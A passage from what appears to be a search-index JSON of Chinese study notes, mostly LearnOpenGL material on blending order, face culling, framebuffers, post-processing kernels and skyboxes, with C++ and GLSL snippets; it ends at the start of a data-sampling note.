\u4e0d\u4f1a\u68c0\u67e5\u7247\u6bb5\u662f\u5426\u900f\u660e\uff0c\u5373\u900f\u660e\u90e8\u5206\u4e5f\u4f1a\u88ab\u5199\u5165\u6df1\u5ea6\u7f13\u51b2\u4e2d\uff0c\u6b64\u65f6\u540e\u9762\u7684\u7269\u4f53\u53ef\u80fd\u4f1a\u88ab\u6df1\u5ea6\u6d4b\u8bd5\u4e22\u5f03\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u624b\u52a8\u8c03\u6574\u6e32\u67d3\u987a\u5e8f\uff0c\u5373\u4ece\u8fdc\u5230\u8fd1\u8fdb\u884c\u7ed8\u5236\u3002\u4e0d\u8fc7\u5bf9\u4e8e\u8349\u7eb9\u7406\u8fd9\u79cd\u5468\u56f4\u5168\u900f\u660e\u7684\u7269\u4f53\uff0c\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9\u4e22\u5f03\u900f\u660e\u7684\u7247\u6bb5\u800c\u4e0d\u662f\u542f\u7528\u6df7\u5408\u3002</p> <p>\u5f53\u7ed8\u5236\u4e00\u4e2a\u5b58\u5728\u900f\u660e\u7269\u4f53\u7684\u573a\u666f\u65f6\uff0c\u5927\u4f53\u7684\u539f\u5219\u5982\u4e0b\uff1a</p> <ol> <li>\u5148\u7ed8\u5236\u6240\u6709\u4e0d\u900f\u660e\u7684\u7269\u4f53\u3002</li> <li>\u6309\u7167\u4ece\u8fdc\u5230\u8fd1\u5bf9\u6240\u6709\u900f\u660e\u7684\u7269\u4f53\u6392\u5e8f\u3002</li> <li>\u6309\u987a\u5e8f\u7ed8\u5236\u6240\u6709\u900f\u660e\u7684\u7269\u4f53\u3002</li> </ol> <p>\u53ef\u4ee5\u901a\u8fc7 STL \u7684 map \u6570\u636e\u7ed3\u6784\uff0c\u6839\u636e\u952e\u503c <code>distance</code> \u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a</p> <pre><code>std::map&lt;float, glm::vec3&gt; sorted;\nfor (unsigned int i = 0; i &lt; windows.size(); i++)\n{\n    float distance = glm::length(camera.Position - windows[i]);\n    sorted[distance] = windows[i];\n}\n</code></pre> <p>\u5728\u4e4b\u540e\u6e32\u67d3\u7684\u65f6\u5019\uff0c\u53ea\u9700\u8981\u9006\u5e8f\u53d6\u51fa\u5373\u53ef\uff1a</p> <pre><code>for(std::map&lt;float,glm::vec3&gt;::reverse_iterator it = sorted.rbegin(); it != sorted.rend(); ++it) \n{\n    model = glm::mat4();\n    model = glm::translate(model, it-&gt;second);              \n    shader.setMat4(\"model\", model);\n    glDrawArrays(GL_TRIANGLES, 0, 6);\n}\n</code></pre> <p>\u5b83\u5e76\u6ca1\u6709\u8003\u8651\u65cb\u8f6c\u3001\u7f29\u653e\u7b49\u5176\u5b83\u53d8\u6362\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u975e\u5e38\u56f0\u96be\u7684\u6280\u672f</p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_4","title":"\u9762\u5254\u9664","text":"<p>\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5bf9\u4e8e\u4e00\u4e2a 3D \u7acb\u65b9\u4f53\uff0c\u65e0\u8bba\u4f60\u4ece\u54ea\u4e2a\u65b9\u5411\u770b\uff0c\u6700\u591a\u4e5f\u53ea\u80fd\u770b\u5230\u4e09\u4e2a\u9762\u3002\u5982\u679c\u6211\u4eec\u80fd\u4ee5\u67d0\u79cd\u65b9\u5f0f\u4e22\u5f03\u53e6\u5916\u51e0\u4e2a\u770b\u4e0d\u89c1\u7684\u9762\uff0c\u6211\u4eec\u80fd\u7701\u4e0b\u8d85\u8fc7 50% \u7684\u7247\u6bb5\u7740\u8272\u5668\u6267\u884c\u6570\uff01</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u95ed\u5408\u5f62\u72b6\uff0c\u5b83\u7684\u4e00\u4e2a\u9762\u90fd\u5177\u6709\u9762\u5411\u7528\u6237\u548c\u80cc\u5411\u7528\u6237\u7684\u4e24\u4fa7\uff0c\u800c\u9762\u5254\u9664\uff08Face Culling\uff09\u6b63\u662f\u68c0\u67e5\u6240\u6709 Front Facing \u9762\uff0c\u5e76\u4e14\u4e22\u5f03 Back Facing \u7684\u9762\u3002</p> <p>OpenGL \u5728\u6e32\u67d3\u56fe\u5143\u7684\u65f6\u5019\u6839\u636e\u4e09\u89d2\u5f62\u9876\u70b9\u7684\u73af\u7ed5\u987a\u5e8f\u6765\u786e\u5b9a\u4e00\u4e2a\u4e09\u89d2\u5f62\u662f\u6b63\u5411\u8fd8\u662f\u80cc\u5411\u7684\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u9006\u65f6\u9488\u9876\u70b9\u5b9a\u4e49\u7684\u4e09\u89d2\u5f62\u4f1a\u88ab\u5904\u7406\u4e3a\u6b63\u5411\u4e09\u89d2\u5f62\uff1a</p> <p></p> <pre><code>float vertices[] = {\n    // \u987a\u65f6\u9488\n    vertices[0], // \u9876\u70b91\n    vertices[1], // \u9876\u70b92\n    vertices[2], // \u9876\u70b93\n    // \u9006\u65f6\u9488\n    vertices[0], // \u9876\u70b91\n    vertices[2], // \u9876\u70b93\n    vertices[1]  // \u9876\u70b92  \n};\n</code></pre> <p>\u6211\u4eec\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u542f\u7528 OpenGL \u7684\u9762\u5254\u9664\u9009\u9879\uff1a</p> <pre><code>glEnable(GL_CULL_FACE);\n</code></pre> <p>\u6b64\u65f6\u6240\u6709\u80cc\u5411\u9762\u5728\u6e32\u67d3\u65f6\u90fd\u4f1a\u88ab\u5254\u9664\u3002</p> <p>\u6211\u4eec\u5e94\u8be5\u4fdd\u8bc1\u5254\u9664\u4ec5\u5bf9\u7acb\u65b9\u4f53\u8fd9\u79cd\u5c01\u95ed\u5f62\u72b6\u6709\u6548\uff0c\u67d0\u4e9b\u9762\u7684\u6b63\u5411\u548c\u80cc\u5411\u90fd\u5e94\u53ef\u89c1</p> <p>OpenGL \u5141\u8bb8\u6211\u4eec\u6539\u53d8\u5254\u9664\u9762\u7684\u7c7b\u578b\uff1a</p> <pre><code>glCullFace(GL_BACK); // \u9ed8\u8ba4\u5254\u9664\u80cc\u5411\u9762\n</code></pre> <ul> <li><code>GL_BACK</code>\uff1a\u53ea\u5254\u9664\u80cc\u5411\u9762\u3002</li> <li><code>GL_FRONT</code>\uff1a\u53ea\u5254\u9664\u6b63\u5411\u9762\u3002</li> <li><code>GL_FRONT_AND_BACK</code>\uff1a\u5254\u9664\u6b63\u5411\u9762\u548c\u80cc\u5411\u9762\u3002</li> </ul>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_5","title":"\u5e27\u7f13\u51b2","text":"<p>\u989c\u8272\u7f13\u51b2\u3001\u6df1\u5ea6\u7f13\u51b2\u3001\u6a21\u677f\u7f13\u51b2\u7b49\u7ed3\u5408\u8d77\u6765\u53eb\u5e27\u7f13\u51b2(FrameBuffer)\uff0c\u5b83\u88ab\u5b58\u50a8\u4e0e GPU \u5185\u5b58\u4e2d\uff0c\u5e76\u4e14\u53ef\u4ee5\u7531\u6211\u4eec\u8fdb\u884c\u81ea\u5b9a\u4e49\u64cd\u4f5c\u3002</p> <pre><code>unsigned int fbo;\nglGenFramebuffers(1, &amp;fbo);\n\nglBindFramebuffer(GL_FRAMEBUFFER, fbo);\n</code></pre> <p>\u4e0a\u9762\u7684\u7b80\u5355\u64cd\u4f5c\u5e76\u4e0d\u80fd\u7b80\u5355\u521b\u9020\u51fa\u4e00\u4e2a\u80fd\u591f\u4f7f\u7528\u7684\u5e27\u7f13\u51b2\uff0c\u56e0\u4e3a\u5b83\u8fd8\u4e0d\u5b8c\u6574\uff1a</p> <ul> <li>\u9644\u52a0\u81f3\u5c11\u4e00\u4e2a\u7f13\u51b2\uff08\u989c\u8272\u3001\u6df1\u5ea6\u6216\u6a21\u677f\u7f13\u51b2\uff09\u3002</li> <li>\u81f3\u5c11\u6709\u4e00\u4e2a\u989c\u8272\u9644\u4ef6(Attachment)\u3002</li> <li>\u6240\u6709\u7684\u9644\u4ef6\u90fd\u5fc5\u987b\u662f\u5b8c\u6574\u7684\uff08\u4fdd\u7559\u4e86\u5185\u5b58\uff09\u3002</li> <li>\u6bcf\u4e2a\u7f13\u51b2\u90fd\u5e94\u8be5\u6709\u76f8\u540c\u7684\u6837\u672c\u6570(sample)\u3002</li> </ul> <p>\u4ece\u4e0a\u9762\u7684\u6761\u4ef6\u4e2d\u53ef\u4ee5\u77e5\u9053\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u5e27\u7f13\u51b2\u521b\u5efa\u4e00\u4e9b\u9644\u4ef6\uff0c\u5e76\u5c06\u9644\u4ef6\u9644\u52a0\u5230\u5e27\u7f13\u51b2\u4e0a\u3002\u5728\u5b8c\u6210\u6240\u6709\u7684\u6761\u4ef6\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5 <code>GL_FRAMEBUFFER</code> \u4e3a\u53c2\u6570\u8c03\u7528 <code>glCheckFramebufferStatus</code>\uff1a</p> <pre><code>if(glCheckFramebufferStatus(GL_FRAMEBUFFER) == GL_FRAMEBUFFER_COMPLETE)\n</code></pre> <p>\u4e4b\u540e\u6240\u6709\u7684\u6e32\u67d3\u64cd\u4f5c\u5c06\u4f1a\u6e32\u67d3\u5230\u5f53\u524d\u7ed1\u5b9a\u5e27\u7f13\u51b2\u7684\u9644\u4ef6\u4e2d\u3002\u7531\u4e8e\u6211\u4eec\u7684\u5e27\u7f13\u51b2\u4e0d\u662f\u9ed8\u8ba4\u5e27\u7f13\u51b2\uff0c\u6e32\u67d3\u6307\u4ee4\u5c06\u4e0d\u4f1a\u5bf9\u7a97\u53e3\u7684\u89c6\u89c9\u8f93\u51fa\u6709\u4efb\u4f55\u5f71\u54cd\u3002\u51fa\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u6e32\u67d3\u5230\u4e00\u4e2a\u4e0d\u540c\u7684\u5e27\u7f13\u51b2\u88ab\u53eb\u505a\u79bb\u5c4f\u6e32\u67d3(Off-screen Rendering)\u3002\u8981\u4fdd\u8bc1\u6240\u6709\u7684\u6e32\u67d3\u64cd\u4f5c\u5728\u4e3b\u7a97\u53e3\u4e2d\u6709\u89c6\u89c9\u6548\u679c\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u6fc0\u6d3b\u9ed8\u8ba4\u5e27\u7f13\u51b2\uff0c\u5c06\u5b83\u7ed1\u5b9a\u5230<code>0</code>\u3002</p> <pre><code>glBindFramebuffer(GL_FRAMEBUFFER, 0);\n</code></pre> <p>\u5728\u5b8c\u6210\u6240\u6709\u7684\u5e27\u7f13\u51b2\u64cd\u4f5c\u4e4b\u540e\uff0c\u4e0d\u8981\u5fd8\u8bb0\u5220\u9664\u8fd9\u4e2a\u5e27\u7f13\u51b2\u5bf9\u8c61\uff1a</p> <pre><code>glDeleteFramebuffers(1, &amp;fbo);\n</code></pre> <p>\u5728\u5b8c\u6574\u6027\u68c0\u67e5\u6267\u884c\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u7ed9\u5e27\u7f13\u51b2\u9644\u52a0\u4e00\u4e2a\u9644\u4ef6\u3002\u9644\u4ef6\u662f\u4e00\u4e2a\u5185\u5b58\u4f4d\u7f6e\uff0c\u5b83\u80fd\u591f\u4f5c\u4e3a\u5e27\u7f13\u51b2\u7684\u4e00\u4e2a\u7f13\u51b2\uff0c\u53ef\u4ee5\u5c06\u5b83\u60f3\u8c61\u4e3a\u4e00\u4e2a\u56fe\u50cf\u3002\u5f53\u521b\u5efa\u4e00\u4e2a\u9644\u4ef6\u7684\u65f6\u5019\u6211\u4eec\u6709\u4e24\u4e2a\u9009\u9879\uff1a\u7eb9\u7406\u6216\u6e32\u67d3\u7f13\u51b2\u5bf9\u8c61(Renderbuffer Object)\u3002</p> <p>\u4e3a\u5e27\u7f13\u51b2\u521b\u5efa\u4e00\u4e2a\u7eb9\u7406\u548c\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684\u7eb9\u7406\u5dee\u4e0d\u591a\uff1a</p> <pre><code>unsigned int texture;\nglGenTextures(1, &amp;texture);\nglBindTexture(GL_TEXTURE_2D, texture);\n\nglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, 800, 600, 0, GL_RGB, GL_UNSIGNED_BYTE, NULL);\n\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n</code></pre> <p>\u4e3b\u8981\u7684\u533a\u522b\u5c31\u662f\uff0c\u6211\u4eec\u5c06\u7ef4\u5ea6\u8bbe\u7f6e\u4e3a\u4e86\u5c4f\u5e55\u5927\u5c0f\uff08\u5c3d\u7ba1\u8fd9\u4e0d\u662f\u5fc5\u987b\u7684\uff09\uff0c\u5e76\u4e14\u6211\u4eec\u7ed9\u7eb9\u7406\u7684<code>data</code>\u53c2\u6570\u4f20\u9012\u4e86<code>NULL</code>\u3002\u540c\u6837\u6ce8\u610f\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u73af\u7ed5\u65b9\u5f0f\u6216\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\uff0c\u6211\u4eec\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u4e0d\u4f1a\u9700\u8981\u5b83\u4eec\u3002</p> <p>\u6211\u4eec\u4ec5\u4ec5\u5206\u914d\u4e86\u5185\u5b58\u800c\u6ca1\u6709\u586b\u5145\u5b83\uff0c\u586b\u5145\u8fd9\u4e2a\u7eb9\u7406\u5c06\u4f1a\u5728\u6211\u4eec\u6e32\u67d3\u5230\u5e27\u7f13\u51b2\u4e4b\u540e\u6765\u8fdb\u884c</p> <p>\u6700\u540e\uff0c\u901a\u8fc7 <code>glFramebufferTexture2D</code> \u9644\u52a0\u5230\u5e27\u7f13\u51b2\u4e0a\uff1a</p> <pre><code>glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, texture, 0);\n</code></pre> <p><code>glFrameBufferTexture2D</code> \u6709\u4ee5\u4e0b\u7684\u53c2\u6570\uff1a</p> <ul> <li><code>target</code>\uff1a\u5e27\u7f13\u51b2\u7684\u76ee\u6807\uff08\u7ed8\u5236\u3001\u8bfb\u53d6\u6216\u8005\u4e24\u8005\u7686\u6709\uff09</li> <li><code>attachment</code>\uff1a\u6211\u4eec\u60f3\u8981\u9644\u52a0\u7684\u9644\u4ef6\u7c7b\u578b\u3002\u5f53\u524d\u6211\u4eec\u6b63\u5728\u9644\u52a0\u4e00\u4e2a\u989c\u8272\u9644\u4ef6\u3002\u6ce8\u610f\u6700\u540e\u7684<code>0</code>\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u9644\u52a0\u591a\u4e2a\u989c\u8272\u9644\u4ef6\u3002\u6211\u4eec\u5c06\u5728\u4e4b\u540e\u7684\u6559\u7a0b\u4e2d\u63d0\u5230\u3002</li> <li><code>textarget</code>\uff1a\u4f60\u5e0c\u671b\u9644\u52a0\u7684\u7eb9\u7406\u7c7b\u578b</li> <li><code>texture</code>\uff1a\u8981\u9644\u52a0\u7684\u7eb9\u7406\u672c\u8eab</li> <li><code>level</code>\uff1a\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u7684\u7ea7\u522b\u3002\u6211\u4eec\u5c06\u5b83\u4fdd\u7559\u4e3a0\u3002</li> </ul> <p>\u4e2d\u95f4\u6446\u4e86\uff0c\u76f4\u63a5\u8df3\u5230\u540e\u671f\u5904\u7406\u5427\u3002\u603b\u4e4b\uff0c\u5e27\u7f13\u51b2\u53ef\u7528\u4e8e\u521b\u5efa\u955c\u5b50\u7b49\u6548\u679c\u3002</p> <p>1. \u53cd\u76f8</p> <pre><code>FragColor = vec4(vec3(1.0- result), alpha);\n</code></pre> <p></p> <p>2. \u7070\u5ea6</p> <pre><code>float average = (result.r + result.g + result.b) / 3.0;\nFragColor = vec4(average, average, average, alpha);\n</code></pre> <p></p> <p>\u4f46\u662f\u7531\u4e8e\u4eba\u773c\u5bf9\u7eff\u8272\u66f4\u52a0\u654f\u611f\uff0c\u5bf9\u84dd\u8272\u66f4\u4e0d\u654f\u611f\uff0c\u6240\u4ee5\u4ee5\u4e0b\u52a0\u6743\u7070\u5ea6\u503c\u8ba1\u7b97\u89c6\u89c9\u6548\u679c\u66f4\u597d\uff1a</p> <pre><code>float average = 0.2126 * result.r + 0.7152 * result.g + 0.0722 * result.b;\n</code></pre> <p>3. \u6838\u6548\u679c</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728\u5f53\u524d\u7eb9\u7406\u7684\u5468\u56f4\u533a\u57df\u91c7\u6837\uff0c\u6765\u521b\u5efa\u51fa\u4e00\u4e9b\u5f88\u6709\u610f\u601d\u7684\u6548\u679c\u3002</p> <p>\u6838\uff08Kernel\uff0c\u6216\u5377\u79ef\u77e9\u9635\uff09\u662f\u4e00\u4e2a\u7c7b\u77e9\u9635\u7684\u6570\u503c\u6570\u7ec4\uff0c\u5b83\u7684\u4e2d\u5fc3\u4e3a\u5f53\u524d\u50cf\u7d20\uff0c\u5e76\u7528\u6838\u503c\u4e58\u4e0a\u5468\u56f4\u7684\u50cf\u7d20\u503c\uff0c\u5e76\u5c06\u7ed3\u679c\u76f8\u52a0\u53d8\u6210\u4e00\u4e2a\u503c\u3002\u4e0b\u9762\u4ee5\u4e00\u4e2a 3\u00d73 \u7684\u6838\u4f5c\u4e3a\u4f8b\u5b50\u5c55\u793a\u6548\u679c\uff1a</p> <pre><code>const float offset = 1.0 / 300.0;  \n\nvoid main()\n{\n    vec2 offsets[9] = vec2[](\n        vec2(-offset,  offset), // \u5de6\u4e0a\n        vec2( 0.0f,    offset), // \u6b63\u4e0a\n        vec2( offset,  offset), // \u53f3\u4e0a\n        vec2(-offset,  0.0f),   // \u5de6\n        vec2( 0.0f,    0.0f),   // \u4e2d\n        vec2( offset,  0.0f),   // \u53f3\n        vec2(-offset, -offset), // \u5de6\u4e0b\n        vec2( 0.0f,   -offset), // \u6b63\u4e0b\n        vec2( offset, -offset)  // \u53f3\u4e0b\n    );\n\n    float kernel[9] = float[](\n        -1, -1, -1,\n        -1,  9, -1,\n        -1, -1, -1\n    );\n\n    vec3 sampleTex[9];\n    for(int i = 0; i &lt; 9; i++)\n    {\n        sampleTex[i] = vec3(texture(screenTexture, TexCoords.st + offsets[i]));\n    }\n    vec3 col = vec3(0.0);\n    for(int i = 0; i &lt; 9; i++)\n        col += sampleTex[i] * kernel[i];\n\n    FragColor = vec4(col, 1.0);\n}\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u662f\u4e00\u4e2a\u9510\u5316\u6838\uff0c\u53ef\u4ee5\u7528\u6765\u6a21\u62df\u4e00\u4e9b\u6e38\u620f\u4e2d\u6253\u4e86\u9ebb\u9189\u9488\u7b49\u9053\u5177\u7684\u6548\u679c\uff1a</p> <p></p> <p>4. \u6a21\u7cca</p> <p>\u6a21\u7cca\u6548\u679c\u6240\u7528\u7684\u6838\u77e9\u9635\u5982\u4e0b\uff1a</p> <pre><code>float kernel[9] = float[](\n    1.0 / 16, 2.0 / 16, 1.0 / 16,\n    2.0 / 16, 4.0 / 16, 2.0 / 16,\n    1.0 / 16, 2.0 / 16, 1.0 / 16  \n);\n</code></pre> <p></p> <p>5. \u8fb9\u7f18\u68c0\u6d4b</p> <p>\u8fd9\u4e2a\u6838\u9ad8\u4eae\u4e86\u6240\u6709\u7684\u8fb9\u7f18\uff0c\u800c\u6697\u5316\u4e86\u5176\u5b83\u90e8\u5206\uff0c\u5728\u6211\u4eec\u53ea\u5173\u5fc3\u56fe\u50cf\u7684\u8fb9\u89d2\u7684\u65f6\u5019\u662f\u975e\u5e38\u6709\u7528\u7684\u3002</p> <pre><code>float kernel[9] = float[](\n    1, 1, 1,\n    1,-8, 1,\n    1, 1, 1\n);\n</code></pre> <p></p>"},{"location":"Accumulation/LearnOpenGL/4.%E9%AB%98%E7%BA%A7OpenGL/#_6","title":"\u7acb\u65b9\u4f53\u8d34\u56fe","text":"<p>\u7acb\u65b9\u4f53\u8d34\u56fe\u7684\u521b\u5efa\u548c\u5176\u5b83\u7eb9\u7406\u76f8\u540c\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8981\u7ed1\u5b9a\u5230 <code>GL_TEXTURE_CUBE_MAP</code> \u4e0a\uff1a</p> <pre><code>unsigned int textureID;\nglGenTextures(1, &amp;textureID);\nglBindTexture(GL_TEXTURE_CUBE_MAP, textureID);\n</code></pre> <p>\u7531\u4e8e\u7acb\u65b9\u4f53\u67096\u4e2a\u9762\uff0cOpenGL\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e866\u4e2a\u7279\u6b8a\u7684\u7eb9\u7406\u76ee\u6807\uff0c\u4e13\u95e8\u5bf9\u5e94\u7acb\u65b9\u4f53\u8d34\u56fe\u7684\u4e00\u4e2a\u9762\u3002</p> \u7eb9\u7406\u76ee\u6807 \u65b9\u4f4d <code>GL_TEXTURE_CUBE_MAP_POSITIVE_X</code> \u53f3 <code>GL_TEXTURE_CUBE_MAP_NEGATIVE_X</code> \u5de6 <code>GL_TEXTURE_CUBE_MAP_POSITIVE_Y</code> \u4e0a <code>GL_TEXTURE_CUBE_MAP_NEGATIVE_Y</code> \u4e0b <code>GL_TEXTURE_CUBE_MAP_POSITIVE_Z</code> \u540e <code>GL_TEXTURE_CUBE_MAP_NEGATIVE_Z</code> \u524d <p>\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u9012\u589e 1 \u7684\u65b9\u5f0f\u904d\u5386\u8fd9\u516d\u4e2a\u9762</p> <pre><code>int width, height, nrChannels;\nunsigned char *data;  \nfor(unsigned int i = 0; i &lt; textures_faces.size(); i++)\n{\n    data = stbi_load(textures_faces[i].c_str(), &amp;width, &amp;height, &amp;nrChannels, 0);\n    glTexImage2D(\n        GL_TEXTURE_CUBE_MAP_POSITIVE_X + i, \n        0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data\n    );\n}\n</code></pre> <p>\u7acb\u65b9\u4f53\u8d34\u56fe\u7684\u73af\u7ed5\u548c\u8fc7\u6ee4\u65b9\u5f0f\u4e00\u822c\u8bbe\u7f6e\u4e3a\uff1a</p> <pre><code>glTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\nglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\nglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\nglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\nglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_R, GL_CLAMP_TO_EDGE);\n</code></pre> <p>\u800c\u5728\u7acb\u65b9\u4f53\u8d34\u56fe\u7684\u7247\u6bb5\u7740\u8272\u5668\u4e2d\uff0c\u6211\u4eec\u4e5f\u5e94\u4f7f\u7528\u4e0d\u540c\u7c7b\u578b\u7684\u91c7\u6837\u5668\u8fdb\u884c\u91c7\u6837\uff0c\u5e76\u4e14\u7eb9\u7406\u5750\u6807\u5e94\u662f\u4e09\u7ef4\u7684\uff1a</p> <pre><code>in vec3 textureDir; // \u4ee3\u88683D\u7eb9\u7406\u5750\u6807\u7684\u65b9\u5411\u5411\u91cf\nuniform samplerCube cubemap; // \u7acb\u65b9\u4f53\u8d34\u56fe\u7684\u7eb9\u7406\u91c7\u6837\u5668\n\nvoid main()\n{             \n    FragColor = texture(cubemap, textureDir);\n}\n</code></pre> <p>\u5929\u7a7a\u76d2\u5c31\u662f\u4e00\u4e2a\u5305\u542b\u4e86\u6574\u4e2a\u573a\u666f\u7684\u5927\u7acb\u65b9\u4f53\uff0c\u5b83\u5305\u542b\u5468\u56f4\u73af\u5883\u7684\u516d\u4e2a\u56fe\u50cf</p> <pre><code>// Vertex Shader\n#version 330 core\n\nlayout (location = 0) in vec3 aPos;\n\nout vec3 TexCoords;\n\nuniform mat4 projection;\nuniform mat4 view;\n\nvoid main()\n{\n    TexCoords = aPos;\n    vec4 pos = projection * view * vec4(aPos, 1.0);\n    gl_Position = pos.xyww;\n}\n\n// Fragment Shader\n#version 330 core\nout vec4 FragColor;\n\nin vec3 TexCoords;\n\nuniform samplerCube skybox;\n\nvoid main()\n{    \n    FragColor = texture(skybox, TexCoords);\n}\n</code></pre> <pre><code>    vector&lt;std::string&gt; faces\n    {\n        \"skybox/right.jpg\",\n        \"skybox/left.jpg\",\n        \"skybox/top.jpg\",\n        \"skybox/bottom.jpg\",\n        \"skybox/front.jpg\",\n        \"skybox/back.jpg\"\n    };\n    unsigned int cubemapTexture = loadCubemap(faces);\n\n    Shader skyboxShader(\"shader/skybox/shader.vs\", \"shader/skybox/shader.fs\");\n\n    unsigned int skyboxVAO, skyboxVBO;\n    glGenVertexArrays(1, &amp;skyboxVAO);\n    glGenBuffers(1, &amp;skyboxVBO);\n    glBindVertexArray(skyboxVAO);\n    glBindBuffer(GL_ARRAY_BUFFER, skyboxVBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(skyboxVertices), &amp;skyboxVertices, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n\n    skyboxShader.use();\n    skyboxShader.setInt(\"skybox\", 0);\n\n\n// in render loop:\n        // draw skybox as last\n        glDepthFunc(GL_LEQUAL);  // change depth function so depth test passes when values are equal to depth buffer's content\n        skyboxShader.use();\n        view = glm::mat4(glm::mat3(camera.GetViewMatrix())); // remove translation from the view matrix\n        skyboxShader.setMatrix4(\"view\", glm::value_ptr(view));\n        skyboxShader.setMatrix4(\"projection\", glm::value_ptr(projection));\n        // skybox cube\n        glBindVertexArray(skyboxVAO);\n        glActiveTexture(GL_TEXTURE0);\n        glBindTexture(GL_TEXTURE_CUBE_MAP, cubemapTexture);\n        glDrawArrays(GL_TRIANGLES, 0, 36);\n        glBindVertexArray(0);\n        glDepthFunc(GL_LESS); // set depth function back to default\n</code></pre>"},{"location":"Accumulation/ML/Data%20Analysis/","title":"Data Analysis","text":""},{"location":"Accumulation/ML/Data%20Analysis/#data-analysis","title":"Data Analysis","text":"<p> \u7ea6 525 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Accumulation/ML/Data%20Analysis/#data","title":"Data","text":"<p>\u6211\u4eec\u5b9a\u91cf\u3001\u5b9a\u6027\u7684\u63cf\u8ff0\u6570\u636e\uff1a</p> <ul> <li>\u5b9a\u91cf Quantitative<ul> <li>\u6570\u503c\u91cf</li> <li>\u8fde\u7eed or \u79bb\u6563\uff1f</li> </ul> </li> <li>\u5b9a\u6027 Qualitative<ul> <li>Categorical / Nominal</li> <li>\u63cf\u8ff0\u7a0b\u5ea6\u7684\u6807\u51c6</li> </ul> </li> </ul> <p>\u4ece\u539f\u6570\u636e\u96c6\u9009\u62e9\u5c11\u90e8\u5206\u6784\u6210\u65b0\u6570\u636e\u7684\u8fc7\u7a0b\u79f0\u4e3a\u6570\u636e\u91c7\u6837\uff0c\u5b83\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>\u51cf\u5c11\u6570\u636e\u96c6\uff0c\u63d0\u5347\u6a21\u578b\u7a33\u5b9a</li> <li>\u589e\u52a0\u901f\u5ea6\u3001\u6548\u7387</li> <li>\u51cf\u5c11\u8fc7\u62df\u5408</li> <li>\u63d0\u5347\u6a21\u578b\u8868\u73b0</li> <li>\u521b\u9020\u5e73\u8861\u7684\u6570\u636e\u96c6</li> </ul> \u6982\u7387\u91c7\u6837 Probability Sampling\u975e\u6982\u7387\u91c7\u6837 Non-Probability Sampling <ul> <li>\u968f\u673a\u91c7\u6837</li> <li>\u7cfb\u7edf\u91c7\u6837</li> <li>\u5206\u5c42\u91c7\u6837</li> <li>\u805a\u7c7b\u91c7\u6837</li> </ul> <ul> <li>\u4fbf\u5229\u91c7\u6837</li> <li>\u76ee\u7684\u91c7\u6837</li> <li>\u6eda\u96ea\u7403\u91c7\u6837<ul> <li>\u4f8b\u5982\u91c7\u6837\u4e86\u67d0\u4e2a\u4eba\uff0c\u7531\u90a3\u4e2a\u4eba\u4ecb\u7ecd\u4e0b\u4e00\u4e2a\u88ab\u91c7\u6837\u4eba</li> </ul> </li> </ul>"},{"location":"Accumulation/ML/Data%20Analysis/#_1","title":"\u7279\u5f81\u5de5\u7a0b","text":"<p>\u4e3a\u4e86\u4f7f\u6a21\u578b\u6210\u529f\uff0c\u4fdd\u8bc1\u6570\u636e\u8d28\u91cf\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5bf9\u539f\u59cb\u6570\u636e\u8fdb\u884c\u7279\u5f81\u5de5\u7a0b\u3002</p> <p>\u5bf9\u4e8e\u7f3a\u5931\u503c Missing Values \u53ef\u9009\u5904\u7406\uff1a</p> <ul> <li>\u76f4\u63a5\u7a7a\u7f3a\u7f3a\u5931\u503c</li> <li>\u4f7f\u7528 NA\u3001NULL\u3001NaN 